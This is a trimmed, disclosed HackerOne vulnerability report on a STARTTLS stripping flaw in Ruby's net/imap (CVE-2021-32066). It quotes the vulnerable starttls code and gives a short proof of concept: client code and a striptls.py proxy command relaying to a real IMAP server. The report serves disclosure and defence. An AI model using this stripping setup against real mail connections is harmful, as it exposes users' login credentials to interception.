# [M] imap: StartTLS stripping attack (CVE-2016-0772).

## Summary
Severity: Medium (CVSS 6.5)
Program: Ruby
Weakness: Cryptographic Issues - Generic
Reporter: sighook
State: resolved
Disclosed: 2021-07-08T15:34:20.176Z
CVE: CVE-2021-32066, CVE-2016-0772
Source: https://hackerone.com/reports/1178562

## Details
`net/imap` does not seem to raise an exception when the remote end (imap server)  fails to respond with `tagged_response` (NO/BAD) or `OK` to an explicit call of `imap.starttls`. This may allow a malicious MITM to perform a starttls stripping attack if the client code does not explicitly set `usessl = true` on ` initialize` where it is disabled by default: it is rarely done as one might expect that `starttls` raises an exception when starttls negotiation fails (like when using `usessl` on a server that does not support it or when it fails to negotiate tls due to an ssl exception/cipher mismatch/auth fail).

The vulnerable code:
```ruby
    def starttls(options = {}, verify = true)
      send_command("STARTTLS") do |resp|
        if resp.kind_of?(TaggedResponse) && resp.name == "OK"
          begin
            # for backward compatibility
            certs = options.to_str
            options = create_ssl_params(certs, verify)
          rescue NoMethodError
          end
          start_tls_session(options)
        end # <--- End of handling :)
      end
    end
```

# PoC

For instance, we have the following client code:
```ruby
require 'net/imap'

imap = Net::IMAP.new('0.0.0.0', 9999)
imap.starttls
imap.login('myLOGIN','myPASSWORD')                                            # test login
#imap.authenticate('LOGIN', 'joe_user', 'joes_password') # test auth
imap.disconnect
```
Start the proxy: `python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError`
 (See `striptls.py` in attachments).

Proxy output:
```bash
$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1178562_
